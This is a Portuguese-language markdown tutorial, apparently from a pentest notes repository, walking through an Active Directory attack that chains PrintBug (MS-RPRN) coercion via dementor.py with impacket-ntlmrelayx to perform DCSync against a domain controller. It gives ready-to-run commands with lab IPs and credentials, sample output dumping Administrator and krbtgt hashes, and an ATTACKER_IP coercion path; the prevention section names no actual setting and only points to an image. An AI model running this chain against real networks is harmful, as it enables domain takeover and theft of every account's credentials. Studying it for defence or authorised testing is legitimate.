### 🔍 Ataque PrintBug + NTLMRelayx Explicado

Este ataque combina duas técnicas: PrintBug (MS-RPRN) + NTLM Relay para realizar DCSync e comprometer o domínio. Vamos detalhar cada comando:

## 📡 Comando 1: NTLMRelayx (O Servidor Relay)

```impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support```

O que faz:
- Configura um servidor relay NTLM ouvindo conexões recebidas
- Quando recebe uma autenticação NTLM, ele retransmite para o alvo
- Alvo: dcsync://172.16.18.4 (o Controlador de Domínio)


-t dcsync://172.16.18.4	Alvo = DC em 172.16.18.4, e executa ataque DCSync
-smb2support	Habilita suporte SMB2 (versões modernas do Windows)

O que acontece quando funciona:

```
# Se bem-sucedido, você verá:
[*] SMBD-Thread-5: Connection from DOMINIO/DC$ at 172.16.18.3 controlled, attacking target smb://172.16.18.4
[*] Authenticating against 172.16.18.4 as DOMINIO/DC$ SUCCEED
[*] Starting DCSync attack against 172.16.18.4
[*] Dumping Domain Credentials (DHASH)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4e0a3b5c5c5e6f7f8a9b0c1d2e3f4a5b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::
```

## 🎯 Comando 2: Dementor.py (Gatilho PrintBug)

```python3 ./dementor.py 172.16.18.20 172.16.18.3 -u user -d dominio.local -p Pass123!!```
O que faz:
- Explora a vulnerabilidade MS-RPRN (Print System Remote Protocol)
- Força a máquina alvo a autenticar DE VOLTA ao seu servidor relay
- Este é o "PrintBug" ou ataque "SpoolSample"

172.16.18.20	Seu IP atacante (onde ntlmrelayx está rodando)
172.16.18.3	Máquina alvo a ser acionada (geralmente um DC ou servidor)


Como o PrintBug funciona:
- Dementor.py envia uma chamada RPC específica para o serviço Print Spooler
- Ele diz ao alvo: "Ei, imprima este documento de \\ATTACKER_IP\share"
- O alvo então tenta autenticar no ATTACKER_IP via SMB

Pontos-chave:
- A máquina alvo (172.16.18.3) autentica com sua conta de máquina (SERVER$)
- Contas de máquina frequentemente têm privilégios em Controladores de Domínio (especialmente se for outro DC)
- DCSync requer Admin do Domínio ou direitos específicos de replicação - contas de máquina de DCs têm isso!

## Prevencao
Definir a chave do registro como 1 a habilita, enquanto 2 a desabilita:
<img width="1263" height="238" alt="printspo" src="https://github.com/user-attachments/assets/b76e7a84-1c45-4213-9b9c-3f5118ff1a9a" />


